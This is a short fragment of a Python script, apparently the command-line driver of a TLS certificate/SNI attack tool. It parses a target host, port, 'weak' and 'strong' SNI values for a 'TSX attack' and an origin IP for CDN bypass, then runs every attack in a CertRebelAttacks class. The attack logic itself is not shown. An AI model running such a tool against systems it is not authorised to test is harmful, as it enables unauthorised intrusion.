    parser.add_argument('--timeout', type=float, default=5.0, help='Timeout seconds')
    parser.add_argument('--weak-sni', help='Weak SNI for TSX attack')
    parser.add_argument('--strong-sni', help='Strong SNI for TSX attack')
    parser.add_argument('--origin-ip', help='Origin server IP for CDN bypass analysis')
    
    args = parser.parse_args()
    
    # 运行
    attacker = CertRebelAttacks(args.host, args.port, args.timeout, args.origin_ip)
    results = await attacker.run_all_attacks(args.weak_sni, args.strong_sni)
    
    # 显示
    attacker.print_summary(results)

if __name__ == "__main__":
    asyncio.run(main())